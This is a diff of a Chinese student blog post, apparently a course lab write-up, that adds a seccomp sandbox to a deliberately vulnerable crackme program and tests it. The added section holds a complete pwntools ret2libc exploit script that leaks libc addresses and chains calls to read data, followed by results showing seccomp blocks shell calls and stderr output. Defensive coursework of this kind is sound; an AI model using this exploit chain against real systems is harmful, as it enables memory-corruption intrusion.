@@ -1,4 +1,4 @@
-<!doctype html><html lang=zh><head><title>信息系统安全Lab2 - 胡思乱想集散中心</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name=renderer content="webkit"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=format-detection content="telephone=no,email=no,adress=no"><meta name=theme-color content="#000000"><meta http-equiv=window-target content="_top"><meta name=description content="对stack代码增加seccomp修改 #define _GNU_SOURCE #include &amp;lt;dlfcn.h&amp;gt; #include &amp;lt;seccomp.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; void start() { char buf[64]; printf(&amp;quot;IOLI Crackme Level 0x00\n&amp;quot;); printf(&amp;quot;Password:&amp;quot;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &amp;quot;250382&amp;quot;)) printf(&amp;quot;Password OK :)\n&amp;quot;); else printf(&amp;quot;Invalid Password!\n&amp;quot;); } int main(int argc, char *argv[]) { scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx,"><meta name=generator content="Hugo 0.99.1 with theme pure"><title>信息系统安全Lab2 - 胡思乱想集散中心</title><link rel=stylesheet href=https://qeryu.github.io/css/style.min.084a5eb24fb0cf9d5aade7246f19ba0c820cf904996a28ffe88039427693ac68.css><link rel=stylesheet href=https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css async><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css async><meta property="og:title" content="信息系统安全Lab2"><meta property="og:description" content="对stack代码增加seccomp修改 #define _GNU_SOURCE #include <dlfcn.h> #include <seccomp.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void start() { char buf[64]; printf(&#34;IOLI Crackme Level 0x00\n&#34;); printf(&#34;Password:&#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &#34;250382&#34;)) printf(&#34;Password OK :)\n&#34;); else printf(&#34;Invalid Password!\n&#34;); } int main(int argc, char *argv[]) { scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx,"><meta property="og:type" content="article"><meta property="og:url" content="https://qeryu.github.io/2022/05/infosec_homework2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-20T08:40:30+08:00"><meta property="article:modified_time" content="2022-05-20T08:40:30+08:00"><meta itemprop=name content="信息系统安全Lab2"><meta itemprop=description content="对stack代码增加seccomp修改 #define _GNU_SOURCE #include <dlfcn.h> #include <seccomp.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void start() { char buf[64]; printf(&#34;IOLI Crackme Level 0x00\n&#34;); printf(&#34;Password:&#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &#34;250382&#34;)) printf(&#34;Password OK :)\n&#34;); else printf(&#34;Invalid Password!\n&#34;); } int main(int argc, char *argv[]) { scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx,"><meta itemprop=datePublished content="2022-05-20T08:40:30+08:00"><meta itemprop=dateModified content="2022-05-20T08:40:30+08:00"><meta itemprop=wordCount content="204"><meta itemprop=keywords content="seccomp,ret2libc,"><meta name=twitter:card content="summary"><meta name=twitter:title content="信息系统安全Lab2"><meta name=twitter:description content="对stack代码增加seccomp修改 #define _GNU_SOURCE #include <dlfcn.h> #include <seccomp.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void start() { char buf[64]; printf(&#34;IOLI Crackme Level 0x00\n&#34;); printf(&#34;Password:&#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &#34;250382&#34;)) printf(&#34;Password OK :)\n&#34;); else printf(&#34;Invalid Password!\n&#34;); } int main(int argc, char *argv[]) { scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx,"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<!doctype html><html lang=zh><head><title>信息系统安全Lab2 - 胡思乱想集散中心</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name=renderer content="webkit"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=format-detection content="telephone=no,email=no,adress=no"><meta name=theme-color content="#000000"><meta http-equiv=window-target content="_top"><meta name=description content="修改stack代码 对stack代码增加seccomp修改 #define _GNU_SOURCE #include &amp;lt;dlfcn.h&amp;gt; #include &amp;lt;seccomp.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; void start() { char buf[64]; printf(&amp;quot;IOLI Crackme Level 0x00\n&amp;quot;); printf(&amp;quot;Password:&amp;quot;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &amp;quot;250382&amp;quot;)) printf(&amp;quot;Password OK :)\n&amp;quot;); else printf(&amp;quot;Invalid Password!\n&amp;quot;); } int main(int"><meta name=generator content="Hugo 0.99.1 with theme pure"><title>信息系统安全Lab2 - 胡思乱想集散中心</title><link rel=stylesheet href=https://qeryu.github.io/css/style.min.084a5eb24fb0cf9d5aade7246f19ba0c820cf904996a28ffe88039427693ac68.css><link rel=stylesheet href=https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css async><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css async><meta property="og:title" content="信息系统安全Lab2"><meta property="og:description" content="修改stack代码 对stack代码增加seccomp修改 #define _GNU_SOURCE #include <dlfcn.h> #include <seccomp.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void start() { char buf[64]; printf(&#34;IOLI Crackme Level 0x00\n&#34;); printf(&#34;Password:&#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &#34;250382&#34;)) printf(&#34;Password OK :)\n&#34;); else printf(&#34;Invalid Password!\n&#34;); } int main(int"><meta property="og:type" content="article"><meta property="og:url" content="https://qeryu.github.io/2022/05/infosec_homework2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-20T08:40:30+08:00"><meta property="article:modified_time" content="2022-05-20T08:40:30+08:00"><meta itemprop=name content="信息系统安全Lab2"><meta itemprop=description content="修改stack代码 对stack代码增加seccomp修改 #define _GNU_SOURCE #include <dlfcn.h> #include <seccomp.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void start() { char buf[64]; printf(&#34;IOLI Crackme Level 0x00\n&#34;); printf(&#34;Password:&#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &#34;250382&#34;)) printf(&#34;Password OK :)\n&#34;); else printf(&#34;Invalid Password!\n&#34;); } int main(int"><meta itemprop=datePublished content="2022-05-20T08:40:30+08:00"><meta itemprop=dateModified content="2022-05-20T08:40:30+08:00"><meta itemprop=wordCount content="580"><meta itemprop=keywords content="seccomp,ret2libc,"><meta name=twitter:card content="summary"><meta name=twitter:title content="信息系统安全Lab2"><meta name=twitter:description content="修改stack代码 对stack代码增加seccomp修改 #define _GNU_SOURCE #include <dlfcn.h> #include <seccomp.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void start() { char buf[64]; printf(&#34;IOLI Crackme Level 0x00\n&#34;); printf(&#34;Password:&#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, &#34;250382&#34;)) printf(&#34;Password OK :)\n&#34;); else printf(&#34;Invalid Password!\n&#34;); } int main(int"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
 <script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body class="main-center theme-black" itemscope itemtype=http://schema.org/WebPage><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=slimContent><div class=navbar-header><div class="profile-block text-center"><a id=avatar href=https://github.com/qeryu target=_blank><img class="img-circle img-rotate" src=https://qeryu.github.io/avatar/qeryu.jpg width=200 height=200></a><h2 id=name class="hidden-xs hidden-sm">Qeryu</h2><h3 id=title class="hidden-xs hidden-sm hidden-md">信息安全学生</h3><small id=location class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small></div><div class=search id=search-form-wrap><form class="search-form sidebar-form"><div class=input-group><input type=text class="search-form-input form-control" placeholder=搜索>
 <span class=input-group-btn><button type=submit class="search-form-submit btn btn-flat" onclick=return!1><i class="icon icon-search"></i></button></span></div><div class=ins-search><div class=ins-search-mask></div><div class=ins-search-container><div class=ins-input-wrapper><input type=text class=ins-search-input placeholder=想要查找什么... x-webkit-speech>
 <button type=button class="close ins-close ins-selectable" data-dismiss=modal aria-label=Close><span aria-hidden=true>×</span></button></div><div class=ins-section-wrapper><div class=ins-section-container></div></div></div></div></form></div><button class="navbar-toggle collapsed" type=button data-toggle=collapse data-target=#main-navbar aria-controls=main-navbar aria-expanded=false>
@@ -60,8 +60,8 @@
 <span class=article-tag><i class="icon icon-tags"></i>&nbsp;
 <a class=article-tag-link href=/tags/seccomp/>seccomp</a>
 <a class=article-tag-link href=/tags/ret2libc/>ret2libc</a></span>
-<span class="post-wordcount hidden-xs" itemprop=wordCount>字数统计: 204字</span>
-<span class="post-readcount hidden-xs" itemprop=timeRequired>阅读时长: 1分</span></div></div><div class="article-entry marked-body js-toc-content" itemprop=articleBody><p>对stack代码增加seccomp修改</p><pre><code class=language-c>#define _GNU_SOURCE
+<span class="post-wordcount hidden-xs" itemprop=wordCount>字数统计: 580字</span>
+<span class="post-readcount hidden-xs" itemprop=timeRequired>阅读时长: 2分</span></div></div><div class="article-entry marked-body js-toc-content" itemprop=articleBody><h1 id=修改stack代码>修改stack代码</h1><p>对stack代码增加seccomp修改</p><pre><code class=language-c>#define _GNU_SOURCE
 #include &lt;dlfcn.h&gt;
 #include &lt;seccomp.h&gt;
 #include &lt;stdio.h&gt;
@@ -120,7 +120,95 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre><p>执行shell时报错</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527205530448.png alt=image-20220527205530448></p><p>想stderr输出也是错误终止</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527205742787.png alt=image-20220527205742787></p><p>也可以限制超长输出</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527210022092.png alt=image-20220527210022092></p></div><div class=article-footer><blockquote class=mt-2x><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接:</strong>
+</code></pre><p>执行shell时报错</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527205530448.png alt=image-20220527205530448></p><p>想stderr输出也是错误终止</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527205742787.png alt=image-20220527205742787></p><p>也可以限制超长输出</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527210022092.png alt=image-20220527210022092></p><h1 id=通过攻击验证>通过攻击验证</h1><h2 id=同作业1的write函数>同作业1的write函数</h2><p>继续沿用作业1中的exploit代码需要修改pr、ppr、pppr以及bss端的地址</p><pre><code class=language-python>from pwn import *
+bin_name = &quot;./stack_seccomp&quot;
+libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
+p = process(bin_name)
+stack = ELF(bin_name)
+
+PR = 0x0804901e
+PPR = 0x080494ea
+PPPR = 0x080494e9
+num = 76
+bss1_addr = 0x0804c048
+bss2_addr = bss1_addr+50
+
+payload = b'A' * num
+
+plt_puts = stack.plt['puts']
+print('%#x' % plt_puts)
+start_addr = stack.symbols['start']
+print('%#x' % start_addr)
+got_libc_start_main = stack.got['__libc_start_main']
+print('%#x' % got_libc_start_main)
+
+payload += p32(plt_puts)
+payload += p32(start_addr)
+payload += p32(got_libc_start_main)
+
+print('payload:', payload)
+
+p.sendline(payload)
+p.recvuntil(b&quot;Invalid Password!\n&quot;)
+libc_start_main_addr = u32(p.recv(4))
+print('%#x' % libc_start_main_addr)
+libc_base = libc_start_main_addr-libc.symbols[&quot;__libc_start_main&quot;]
+print('%#x' % libc_base)
+
+open_addr = libc_base+libc.symbols[&quot;open&quot;]
+read_addr = libc_base+libc.symbols[&quot;read&quot;]
+write_addr = libc_base+libc.symbols[&quot;write&quot;]
+gets_addr = libc_base+libc.symbols[&quot;gets&quot;]
+puts_addr = libc_base+libc.symbols[&quot;puts&quot;]
+exec_addr = libc_base+libc.symbols[&quot;execve&quot;]
+
+printf_addr = libc_base+libc.symbols[&quot;printf&quot;]
+scanf_addr = libc_base+libc.symbols[&quot;scanf&quot;]
+
+exit_addr = libc_base+libc.symbols[&quot;exit&quot;]
+system_addr = libc_base+libc.symbols[&quot;system&quot;]
+
+# open(&quot;/tmp/flag&quot;, 0)  #some note for file reading
+# read(3, buf, 1048)
+# write(1, buf, 1048)
+
+payload = b'A' * num
+
+payload += p32(gets_addr)
+payload += p32(PR)
+payload += p32(bss1_addr)
+
+payload += p32(puts_addr)
+payload += p32(PR)
+payload += p32(bss1_addr)
+
+# payload += p32(open_addr)
+# payload += p32(PPR)
+# payload += p32(bss1_addr)
+# payload += p32(0)
+
+# payload += p32(read_addr)
+# payload += p32(PPPR)
+# payload += p32(3)
+# payload += p32(bss2_addr)
+# payload += p32(64)
+
+payload += p32(write_addr)
+payload += p32(PPPR)
+payload += p32(2)
+payload += p32(bss1_addr)
+payload += p32(50)
+
+payload += p32(exit_addr)
+payload += p32(0xdeadbeef)
+payload += p32(0)
+
+print(&quot;payload2: &quot;, payload)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre><p>作业1中write函数输出了64位内容，按理说会报错</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527213414363.png alt=image-20220527213414363></p><h2 id=调用bash>调用bash</h2><p>将输入的字符传入system函数，攻击失败</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527214412667.png alt=image-20220527214412667></p><h2 id=输出小于31位>输出小于31位</h2><p>可以成功输出</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527214603509.png alt=image-20220527214603509></p><h2 id=输出到stderr>输出到stderr</h2><p>仍然是不行，说明现在安全得很了</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220527220322356.png alt=image-20220527220322356></p></div><div class=article-footer><blockquote class=mt-2x><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接:</strong>
 <a href=https://qeryu.github.io/2022/05/infosec_homework2/ title=信息系统安全Lab2 target=_blank rel=external>https://qeryu.github.io/2022/05/infosec_homework2/</a></li><li class=post-copyright-license><strong>License:</strong>
 <a href=http://creativecommons.org/licenses/by/4.0/deed.zh target=_blank rel=external>CC BY 4.0 CN</a></li></ul></blockquote><div class="panel panel-default panel-badger"><div class=panel-body><figure class=media><div class=media-left><a href=https://github.com/qeryu target=_blank class="img-burn thumb-sm visible-lg"><img src=https://qeryu.github.io/avatar/qeryu.jpg class="img-rounded w-full" alt></a></div><div class=media-body><h3 class=media-heading><a href=https://github.com/qeryu target=_blank><span class=text-dark>Qeryu</span><small class=ml-1x>信息安全学生</small></a></h3><div>Good Good Study, Day Day Up~</div></div></figure></div></div></div></article></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class=bar-inner><ul class="pager pull-left"><li class=prev><a href=https://qeryu.github.io/2022/05/cse_lab3_3/ title=网络安全综合实践Lab3-3><i class="icon icon-angle-left" aria-hidden=true></i><span>&nbsp;&nbsp;下一篇</span></a></li><li class=next><a href=https://qeryu.github.io/2022/05/cse_lab3_5/ title="网络安全综合实践lab3 5"><span>上一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden=true></i></a></li><li class=toggle-toc><a class="toggle-btn collapsed" data-toggle=collapse href=#collapseToc aria-expanded=false title=文章目录 role=button><span>[&nbsp;</span><span>文章目录</span>
 <i class="text-collapsed icon icon-anchor"></i>
